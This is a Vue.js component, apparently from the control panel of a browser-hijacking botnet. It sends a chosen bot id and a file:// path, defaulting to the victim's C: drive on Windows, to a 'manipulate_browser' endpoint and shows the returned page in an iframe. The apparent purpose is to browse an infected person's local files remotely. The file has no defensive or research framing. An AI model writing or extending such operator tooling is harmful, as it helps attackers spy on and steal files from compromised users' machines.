<template>
  <div>
    <p>
      <b-input-group prepend="Path" class="mt-3">
        <b-form-input v-model="check_path"></b-form-input>
        <b-input-group-append>
          <b-button
            variant="info"
            :disabled="manipulate_browser_loading"
            v-on:click="manipulate"
            >Check</b-button
          >
        </b-input-group-append>
      </b-input-group>
    </p>
    <p>
      <iframe ref="browser_page" width="100%" height="600px"></iframe>
    </p>
  </div>
</template>

<script>
import { api_request } from "./utils.js";
export default {
  name: "DataBrowser",
  props: {
    id: {
      type: String,
      required: true,
    },
    ua: {
      type: String,
      required: true,
    },
  },
  data() {
    return {
      data: [],
      manipulate_browser_loading: false,
      check_path: this.isWindowsUA(this.ua) ? "file:///C:/" : "file:///",
    };
  },
  methods: {
    isWindowsUA(userAgent) {
      const windowsRegex = /windows|win32/i;
      return windowsRegex.test(userAgent);
    },
    async manipulate() {
      this.manipulate_browser_loading = true;
      await api_request(
        "POST",
        "/manipulate_browser",
        {},
        {
          bot_id: this.id,
          path: this.check_path,
        }
      )
        .then((response) => {
          this.$toastr.s("Browser manipulated successfully.");
          const iframe = this.$refs.browser_page;
          const iframeDocument =
            iframe.contentDocument || iframe.contentWindow.document;

          iframeDocument.open();
          iframeDocument.write(response.html);
          iframeDocument.close();
        })
        .catch((e) => {
          this.$toastr.e(e.error);
        })
        .finally(() => {
          this.manipulate_browser_loading = false;
        });
    },
  },
};
</script>

<style scoped>
/* Add component-specific styles here */
</style>
